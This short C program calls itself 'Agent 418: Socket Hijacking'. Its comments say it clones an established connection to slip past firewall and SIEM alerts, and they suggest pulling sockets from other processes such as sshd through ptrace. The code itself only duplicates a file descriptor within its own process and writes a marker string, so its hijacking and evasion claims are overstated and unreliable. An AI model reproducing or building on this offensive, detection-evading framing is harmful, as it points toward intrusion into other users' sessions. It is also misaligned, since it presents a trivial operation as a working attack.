#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

/* Agent 418: Socket Hijacking.
   Locates an existing established connection FD and 
   duplicates it to bypass firewall/SIEM connection alerts.
*/

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <target_fd_number>\n", argv[0]);
        return 1;
    }

    int target_fd = atoi(argv[1]);
    
    printf("--- [AGENT 418: SOCKET HIJACK ACTIVE] ---\n");
    printf("[*] Attempting to clone FD %d...\n", target_fd);

    // 1. Use dup() to create a copy of the existing socket.
    // In a real 'Military Grade' scenario, we use ptrace to 
    // pull this FD from a DIFFERENT process (like sshd).
    int hijacked_fd = dup(target_fd);

    if (hijacked_fd < 0) {
        perror("dup failed");
        return 1;
    }

    // 2. Send 'Ghost' data through the user's existing tunnel
    const char *msg = "CHIMERA_DATA_PACKET_v4.18\n";
    if (write(hijacked_fd, msg, strlen(msg)) < 0) {
        perror("write failed");
        return 1;
    }

    printf("[\033[92mSUCCESS\033[0m] Data injected into established stream (FD %d).\n", hijacked_fd);
    
    close(hijacked_fd);
    return 0;
}
